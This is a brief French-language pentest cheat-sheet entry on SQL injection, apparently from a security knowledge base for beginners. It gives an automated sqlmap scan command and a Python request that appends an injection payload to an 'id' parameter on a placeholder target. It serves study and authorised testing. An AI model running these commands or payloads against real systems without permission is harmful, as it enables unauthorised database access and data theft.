---
title: SQL Injection
tags: [Web, SQLi]
os: [Linux]
difficulty: Beginner
---

Les injections SQL permettent de manipuler la base de données.

!!! warning
    Toujours tester les paramètres GET et POST.

=== "bash"
    ```bash
    sqlmap -u "http://{{ target_ip }}/index.php?id=1" --batch
    ```

=== "python"
    ```python
    import requests
    requests.get(f"http://{{ target_ip }}/index.php?id=1'-- -")
    ```

!!! ttp "TTP"
    Documente chaque payload utilisé.
